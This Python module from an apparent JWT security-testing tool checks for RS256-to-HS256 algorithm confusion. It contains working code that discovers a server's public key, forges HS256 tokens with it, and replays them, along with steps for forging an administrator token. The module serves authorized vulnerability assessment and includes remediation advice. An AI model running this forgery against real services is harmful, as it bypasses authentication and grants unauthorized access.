"""Attack 7: algorithm confusion, the RSA public key used as an HMAC secret.

A server that issues RS256 tokens verifies them with its RSA PUBLIC key. If it picks the
verification algorithm from the token's own "alg" header instead of pinning it, an attacker can
switch "alg" to HS256 and sign the token with HMAC using the server's PUBLIC key as the secret.
The public key is, by definition, public, so the attacker can forge any token the server accepts.

The trick only works if the HMAC secret is byte-for-byte what the server treats as its key, which
is normally the key's PEM text. Servers (and PEM files) vary in encoding, so we try several
canonical forms: SubjectPublicKeyInfo and PKCS#1, each with and without a trailing newline, plus
any PEM the tester pasted verbatim.

Getting the public key, in order:
  1. Auto-discover it: the token's own jwk/x5c header, its jku/x5u URL, and common JWKS endpoints
     on the target (/.well-known/jwks.json and friends, including the OpenID configuration). A key
     set may hold several keys; we try the one whose kid matches the token first, then the rest.
  2. If that fails, the tester can paste the public key (SPKI/PKCS#1 PEM or an X.509 certificate),
     or paste a JWKS URL to fetch.
"""

import json

import requests

from jwtpen.core.jwt_utils import decode, encode, construct_jwt, sign_hmac
from jwtpen.core.keys import (
    public_key_pem, public_key_pkcs1_pem, jwk_to_public_key, load_public_key_flexible,
)
from jwtpen.core.raw_request import parse_request, swap_token
from jwtpen.core.checker import send, classify, resembles, ACCEPTED, TIMEOUT_SECONDS
from jwtpen.attacks.base import Finding, VULNERABLE, NOT_VULNERABLE, INCONCLUSIVE, HIGH

# JWKS endpoints to probe on the target origin when the token doesn't name its own key source.
_JWKS_COMMON_PATHS = (
    "/.well-known/jwks.json",
    "/jwks.json",
    "/jwks",
    "/api/jwks.json",
    "/.well-known/openid-configuration",  # not a key set itself; we read its "jwks_uri"
)

# The UI attaches an OPTIONAL control for this check: auto-discovery always runs, but the tester
# can paste a public key or a JWKS URL. Like the kid-file control, leaving it blank never blocks
# the run.
PUBKEY_OPTION = True
PUBKEY_HINT = ("Optional. The tool first tries to discover the server's public key (the token's "
               "own headers, its jku/x5u, and common JWKS endpoints). If that fails, paste the "
               "public key (PEM or certificate) or a JWKS URL.")


def _http_get(url):
    """GET a URL for key discovery and return the response, or None on any error.

    TLS verification is on, so a self-signed JWKS host fails closed and simply yields no key
    rather than a trusted-looking one. No cookies are sent: a JWKS endpoint is public.
    """
    try:
        return requests.get(url, timeout=TIMEOUT_SECONDS, verify=True, allow_redirects=True)
    except requests.RequestException:
        return None


def _keys_from_jwks_text(text):
    """Parse a JWK Set JSON string into a list of (kid, public_key), skipping non-RSA/bad keys."""
    keys = []
    try:
        data = json.loads(text)
    except (ValueError, TypeError):
        return keys
    for jwk in data.get("keys", []) if isinstance(data, dict) else []:
        if isinstance(jwk, dict) and jwk.get("kty") == "RSA":
            try:
                keys.append((jwk.get("kid"), jwk_to_public_key(jwk)))
            except (ValueError, KeyError):
                pass
    return keys


def _fetch_jwks_keys(url):
    """Fetch a JWKS (or an OpenID config that points at one) from `url`; return [(kid, key), ...]."""
    response = _http_get(url)
    if response is None or response.status_code != 200:
        return []
    if url.endswith("openid-configuration"):
        try:
            jwks_uri = json.loads(response.text).get("jwks_uri")
        except (ValueError, TypeError):
            return []
        if not jwks_uri:
            return []
        inner = _http_get(jwks_uri)
        return _keys_from_jwks_text(inner.text) if inner and inner.status_code == 200 else []
    return _keys_from_jwks_text(response.text)


def _keys_from_token_header(header):
    """Return [(kid, key), ...] for a key embedded directly in the token header (jwk or x5c)."""
    keys = []
    embedded = header.get("jwk")
    if isinstance(embedded, dict) and embedded.get("kty") == "RSA":
        try:
            keys.append((embedded.get("kid") or header.get("kid"), jwk_to_public_key(embedded)))
        except (ValueError, KeyError):
            pass
    chain = header.get("x5c")
    if isinstance(chain, list) and chain:
        try:
            import base64
            from cryptography.x509 import load_der_x509_certificate

            cert = load_der_x509_certificate(base64.b64decode(chain[0]))
            keys.append((header.get("kid"), cert.public_key()))
        except (ValueError, TypeError):
            pass
    return keys


def gather_public_keys(raw_request, token, scheme, options):
    """Collect candidate RSA public keys to try, in priority order, de-duplicated by their SPKI PEM.

    Returns a list of (source_label, public_key, raw_pem_text). `raw_pem_text` is the exact text a
    tester pasted (so we can also try its literal bytes as the HMAC key), or None otherwise.
    """
    options = options or {}
    parsed = parse_request(raw_request)
    origin = scheme + "://" + parsed["headers"]["Host"]
    header, _, _ = decode(token)
    token_kid = header.get("kid")

    found = []
    seen = set()

    def add(label, key, raw_text=None):
        try:
            fingerprint = public_key_pem(key)
        except (ValueError, TypeError):
            return
        if fingerprint in seen:
            return
        seen.add(fingerprint)
        found.append((label, key, raw_text))

    def add_set(label, kid_key_pairs):
        # Try a key whose kid matches the token first, then the rest, so the likely one leads.
        ordered = sorted(kid_key_pairs, key=lambda pair: pair[0] != token_kid)
        for kid, key in ordered:
            suffix = f" (kid={kid})" if kid else ""
            add(label + suffix, key)

    # 1. Auto-discovery: embedded header key, then the URLs the token names, then common endpoints.
    add_set("token header", _keys_from_token_header(header))
    for url_header in ("jku", "x5u"):
        if header.get(url_header):
            add_set(f"token {url_header} URL", _fetch_jwks_keys(header[url_header]))
    for path in _JWKS_COMMON_PATHS:
        add_set(f"{path}", _fetch_jwks_keys(origin + path))

    # 2. Tester-supplied: a pasted PEM/certificate, and/or a pasted JWKS URL.
    pasted_pem = (options.get("public_key_pem") or "").strip()
    if pasted_pem:
        try:
            add("pasted public key", load_public_key_flexible(pasted_pem), raw_text=pasted_pem)
        except ValueError:
            pass
    jwks_url = (options.get("jwks_url") or "").strip()
    if jwks_url:
        add_set("pasted JWKS URL", _fetch_jwks_keys(jwks_url))

    return found


def _hmac_key_forms(public_key, raw_text):
    """Return [(form_label, key_bytes), ...]: the byte forms of the key to try as the HMAC secret.

    Algorithm confusion needs the secret to be exactly what the server uses, which is almost always
    the key's PEM text. Servers differ on SPKI vs PKCS#1 and on the trailing newline, so we try all
    four, plus any verbatim text the tester pasted (their literal file layout may be what matters).
    """
    spki = public_key_pem(public_key)
    pkcs1 = public_key_pkcs1_pem(public_key)
    forms = [
        ("SPKI PEM", spki),
        ("SPKI PEM, no trailing newline", spki.rstrip(b"\n")),
        ("PKCS#1 PEM", pkcs1),
        ("PKCS#1 PEM, no trailing newline", pkcs1.rstrip(b"\n")),
    ]
    if raw_text:
        forms.insert(0, ("pasted PEM, verbatim", raw_text.encode() if isinstance(raw_text, str) else raw_text))

    # De-duplicate by bytes, keeping first-seen order.
    unique = []
    seen = set()
    for label, key_bytes in forms:
        if key_bytes not in seen:
            seen.add(key_bytes)
            unique.append((label, key_bytes))
    return unique


def forge(token, key_bytes):
    """Rebuild `token` as an HS256 token signed with `key_bytes`, payload and other header fields kept.

    Only "alg" is changed (to HS256); the kid and everything else stay, so the server loads the same
    public key it always would and (if vulnerable) uses those bytes as the HMAC secret.
    """
    header, payload, _ = decode(token)
    header["alg"] = "HS256"
    signing_input = encode(header, payload)
    return construct_jwt(signing_input, sign_hmac(signing_input, key_bytes, "HS256"))


# --- Static content for this attack's report section ---
NAME = "Algorithm Confusion (RS256 to HS256)"
DESCRIPTION = "Checks whether the server's RSA public key can be used as an HMAC secret to forge a token (RS256 switched to HS256)."

_SUMMARY = {
    VULNERABLE: ("The server accepted a token re-signed as HS256 using its own RSA public key as "
                 "the HMAC secret. Because the public key is public, an attacker can forge any "
                 "token and bypass authentication entirely."),
    NOT_VULNERABLE: ("The server rejected every token re-signed as HS256 with its public key, which "
                     "indicates it does not confuse the asymmetric algorithm for a symmetric one."),
    INCONCLUSIVE: ("The result could not be judged automatically: the endpoint responded the same "
                   "way with and without a valid token, so accepted and rejected tokens could not "
                   "be told apart."),
}

_INCONCLUSIVE_NO_KEY = ("This check could not run because the server's RSA public key could not be "
                        "obtained. Provide it directly (paste the PEM or certificate) or give a "
                        "JWKS URL to fetch.")

_REPRODUCTION = [
    "Log in and capture your session JWT (it should be signed with an asymmetric algorithm such as RS256).",
    "Obtain the server's RSA PUBLIC key. It is often published at a JWKS endpoint (for example /.well-known/jwks.json) or named by the token's jku header.",
    "Convert that public key to its PEM text. This exact text, trailing newline included, is the HMAC secret. If it does not work, try the other PEM encoding (SPKI vs PKCS#1) and with/without the trailing newline.",
    'Rebuild the token: keep the payload, change the header "alg" from "RS256" to "HS256", and HMAC-sign (HS256) the token using the public key PEM as the secret.',
    "Resend the request with this token. If you remain logged in, the server verified an HS256 token with its public key. That is the vulnerability.",
    'To demonstrate impact, change a claim (for example "sub" to an administrator), re-sign with the same public-key secret, and resend. If the server grants that access, you have forged a privileged token from public information alone.',
]

_REMEDIATION = (
    "Pin the verification algorithm server-side; never derive it from the token's \"alg\" header. "
    "Verify tokens only against an explicit allow-list of asymmetric algorithms (for example RS256 "
    "or ES256), so an HS256 token is rejected outright and the public key is never usable as a "
    "symmetric secret. Prefer a maintained library that separates verification keys by algorithm."
)

_MANUAL_FOLLOWUP = [
    "The forged token in the evidence is signed with the exact public-key bytes shown beside it. To craft further tokens by hand, keep that same secret form, edit the payload (for example \"sub\"), and re-sign as HS256.",
    "If a hand-made token is rejected, re-check the secret bytes: SPKI vs PKCS#1 PEM and the trailing newline all change the HMAC, and the server accepts only the form it uses internally.",
    "Confirm impact in the application itself, not only in a decoder: resend each edited token to the target and check the privileged action actually succeeds.",
]

_REFERENCES = [
    {"label": "OWASP JSON Web Token for Java Cheat Sheet",
     "url": "https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html"},
    {"label": "OWASP Top 10: Identification and Authentication Failures",
     "url": "https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/"},
    {"label": "RFC 7518: JSON Web Algorithms (JWA), the HS* and RS* algorithms",
     "url": "https://datatracker.ietf.org/doc/html/rfc7518#section-3.1"},
]


def _finding(status, **kwargs):
    """Build this attack's Finding with the shared static fields filled in."""
    return Finding(
        attack=NAME,
        status=status,
        severity=HIGH,
        summary=kwargs.pop("summary", _SUMMARY[status]),
        reproduction=_REPRODUCTION,
        remediation=_REMEDIATION,
        references=_REFERENCES,
        **kwargs,
    )


def run(raw_request, token, scheme, options=None):
    """Run the algorithm-confusion check end to end and return a Finding.

    Baselines are sent once. We gather candidate public keys (auto-discovered or pasted)
    and, for each, try the HMAC-secret byte forms in turn; the FIRST token the server accepts proves
    the vulnerability and records which key source and secret form worked.
    """
    parsed = parse_request(raw_request)
    good = send(parsed, scheme)
    bad = send(parse_request(swap_token(raw_request, token, "INVALID")), scheme)
    url = scheme + "://" + parsed["headers"]["Host"] + parsed["path"]

    if resembles(good, bad):
        # The app answers the same whether or not you're authenticated: no verdict is trustworthy.
        return _finding(INCONCLUSIVE, methodology=[
            "The endpoint responded the same way with and without a valid token, so the result "
            "could not be judged automatically."],
            evidence={"Target URL": url})

    candidates = gather_public_keys(raw_request, token, scheme, options)
    if not candidates:
        return _finding(INCONCLUSIVE, summary=_INCONCLUSIVE_NO_KEY, methodology=[
            "Tried to discover the server's RSA public key from the token's headers, its jku/x5u, "
            "and common JWKS endpoints, and found none; no key or JWKS URL was pasted, so no "
            "forged token could be built."],
            evidence={"Target URL": url})

    accepted = None  # (source, form_label, key_obj, forged_token, response)
    for source, key, raw_text in candidates:
        for form_label, key_bytes in _hmac_key_forms(key, raw_text):
            forged_token = forge(token, key_bytes)
            response = send(parse_request(swap_token(raw_request, token, forged_token)), scheme)
            if classify(good, bad, response) == ACCEPTED:
                accepted = (source, form_label, key, forged_token, response)
                break
        if accepted is not None:
            break
    status = VULNERABLE if accepted is not None else NOT_VULNERABLE

    methodology = [
        f"Obtained the server's RSA public key ({len(candidates)} candidate(s) from discovery "
        "or paste).",
        'Changed the token\'s "alg" from the asymmetric algorithm to "HS256" and HMAC-signed it '
        "using the public key's PEM bytes as the secret, trying several encodings.",
        "Resent your original request with each forged token.",
    ]
    evidence = {
        "Target URL": url,
        "Expected Response (Valid Token)": f"HTTP {good.status_code}",
    }
    manual_followup = []
    if accepted is not None:
        source, form_label, key, forged_token, response = accepted
        methodology.append(
            f"The server accepted the token (public key from: {source}; secret form: {form_label}), "
            "so it verified an HS256 token with its RSA public key.")
        evidence["Received Response (Forged Token)"] = f"HTTP {response.status_code}"
        evidence["Public Key Source"] = source
        evidence["HMAC Secret Form"] = form_label
        evidence["Public Key (PEM)"] = public_key_pem(key).decode()
        evidence["Forged Token"] = forged_token
        manual_followup = _MANUAL_FOLLOWUP
    elif status == NOT_VULNERABLE:
        methodology.append("The server rejected every candidate and secret form, so it does not "
                           "confuse RS256 for HS256.")

    return _finding(status, methodology=methodology, evidence=evidence, manual_followup=manual_followup)
